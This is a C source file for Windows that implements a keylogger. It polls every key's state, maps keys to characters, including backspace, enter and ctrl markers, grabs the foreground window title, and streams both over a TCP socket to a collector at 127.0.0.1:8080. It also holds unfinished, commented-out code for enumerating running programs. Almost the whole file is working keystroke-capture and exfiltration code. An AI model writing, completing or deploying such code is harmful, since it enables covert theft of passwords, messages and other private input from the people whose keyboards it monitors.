#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <stdlib.h>
#include <stdint.h>

#define MSG_BUFF_LEN 15

void vkey_to_char(int vKey, char buffer[MSG_BUFF_LEN]) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    // Checks if shift key is being held down
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
        keyboardState[VK_SHIFT] |= 0x80;
    }

    UINT scanCode = MapVirtualKey(vKey, MAPVK_VK_TO_VSC);
    WCHAR unicodeChar[4] = {0};
    int result = ToUnicode(vKey, scanCode, keyboardState, unicodeChar, 4, 0);

    if (result > 0) {
        if (unicodeChar[0] >= 32 && unicodeChar[0] <= 126) {
            buffer[0] = (char)unicodeChar[0];
            buffer[1] = '\0';
        } else if (unicodeChar[0] == 8) { // Backspace
            strcpy(buffer, "\xE2\x8C\xAB");
        } else if (unicodeChar[0] == 13) { // Enter
            strcpy(buffer, "\xE2\x86\xB5");
        } else {
            buffer[0] = '\0';
        }
    } else {
        buffer[0] = '\0';
    }
}

BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        printf("\nCtrl+C received. Cleaning up...\n");
        // Optionally reset keyStates, send final message, etc.
        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
        WSACleanup();
        exit(0);
    }
    return TRUE;
}

#define MAX_EXES 100

typedef struct {
    char exeList[MAX_EXES][MAX_PATH];
    int exeCount;
} ExeArr;

BOOL checkIfWindowsChanged(ExeArr *exeArr, char lastList[MAX_EXES][MAX_PATH]) {
    ;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lparam) {
    // instead of LPARAM lparam, its ExeArr *exeArr, pointer to that struct
    DWORD pid;
    char name[MAX_PATH];

    if (IsWindowVisible(hwnd)) {
        // get process id for window
        GetWindowThreadProcessId(hwnd, &pid);
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProc != NULL) {
            if (GetModuleBaseNameA(hProc, NULL, name, sizeof(name)) > 0) {
                ExeArr *data = (ExeArr *)lparam;  // cast type lparam into a pointer to ExeArr type
                strcpy(data->exeList[data->exeCount], name);
                data->exeCount++;
            }
            CloseHandle(hProc);
        }
        // printf("Window handle: %p\n", hwnd);
    }
    return TRUE;
}

char *handleFocusedWindow() {
    char *titleBuff = malloc(512);
    if (!titleBuff) return NULL;

    HWND hwnd = GetForegroundWindow();
    int length = GetWindowTextA(hwnd, titleBuff, 512);

    if (length > 0) {
        titleBuff[length] = '\0';  // ensure null termination
    } else {
        titleBuff[0] = '\0';
    }

    // printf("Current window - %s, length - %d\n", titleBuff, length);
    return titleBuff;
}


int main() {
    FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);  // run control c event handler

    WSADATA wsa;
    int startupResult = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (startupResult != 0) {
        printf("WSAStartup failed: %d\n", startupResult);
        return 1;
    }

    SOCKET client_socket;
    client_socket = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(8080);

    if (connect(client_socket, (struct sockaddr*)&server, sizeof(server)) == -1) {
        // If there is not a successfull connection
        printf("%s", GetLastError());
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }

    printf("Established Connection\n");

    for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
        GetAsyncKeyState(vKey); // Clears LSB so only future presses are seen
    }
    
    char newMsgBuff[MSG_BUFF_LEN] = {0};
    char *windowCapBuff;
    // char prevMsgBuff[MSG_BUFF_LEN] = {0};

    BYTE keyStates[256] = {0};
    int holdClock = 0;

    while (1) {
        for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
            // state is bit 1000 0000 0000 0000 if that key is down
            SHORT state = GetAsyncKeyState(vKey);
            // Key is now pressed but wasn't before, !keyStates[vKey] returns True if keyStates[vKey] is 0 / not 1
            if ((state & 0x8000) && !keyStates[vKey]) {
                keyStates[vKey] = 1;  // Mark as pressed

                vkey_to_char(vKey, newMsgBuff);  // modify vkey if necessary and add to buffer before sending

                if (vKey == VK_LCONTROL || vKey == VK_RCONTROL) {
                    strcpy(newMsgBuff, "\xC2\xA9");
                }

                if (newMsgBuff[0] != '\0') {
                    // printf("Typed: %s\n", newMsgBuff);
                    // we send upon a detected key press
                    windowCapBuff = handleFocusedWindow();
                    uint8_t capLen = (uint8_t)strlen(windowCapBuff);
                    uint8_t keyLen = (uint8_t)MSG_BUFF_LEN;

                    send(client_socket, &capLen, 1, 0);
                    send(client_socket, windowCapBuff, capLen, 0);

                    send(client_socket, &keyLen, 1, 0);
                    send(client_socket, newMsgBuff, keyLen, 0);
                    printf("Caption: %s - StrLen: %d - CapLen: %d\n", windowCapBuff, strlen(windowCapBuff), capLen);
                }
            } else if ((state & 0x8000) && keyStates[vKey]) {  // held down state
                vkey_to_char(vKey, newMsgBuff);  // modify vkey if necessary and add to buffer before sending

                if (vKey == VK_LCONTROL || vKey == VK_RCONTROL) {
                    strcpy(newMsgBuff, "\xC2\xA9");
                }

                if (newMsgBuff[0] != '\0' && holdClock > 30) {
                    // printf("Typed: %s\n", newMsgBuff);
                    // we send upon a detected key press
                    // send(client_socket, newMsgBuff, strlen(newMsgBuff), 0);
                    windowCapBuff = handleFocusedWindow();
                    uint8_t capLen = (uint8_t)strlen(windowCapBuff);
                    uint8_t keyLen = (uint8_t)MSG_BUFF_LEN;

                    send(client_socket, &capLen, 1, 0);
                    send(client_socket, windowCapBuff, capLen, 0);

                    send(client_socket, &keyLen, 1, 0);
                    send(client_socket, newMsgBuff, keyLen, 0);
                    printf("Caption: %s - Len: %d\n", newMsgBuff, strlen(newMsgBuff));
                }
                holdClock++;
            } else if (!(state & 0x8000) && keyStates[vKey]) {
                keyStates[vKey] = 0;  // Key is now released
                holdClock = 0;
            }
        }

        // handleFocusedWindow();
        
        // ExeArr exeArr = {0};  // zero-initialize count and the array
        // Make copy exeList to compare with next iteration
        // char lastList[MAX_EXES][MAX_PATH];
        // EnumWindows(EnumWindowsProc, (LPARAM)&exeArr);  // have to cast exeArr type into LPARAM type
        // checkIfWindowsChanged(&exeArr, lastList);
        // for (int i = 0; i < exeArr.exeCount; i++) {
        //     printf("EXE: %s\n", exeArr.exeList[i]);
        // }
        Sleep(10);  // 10ms delay
    }
    return 0;
}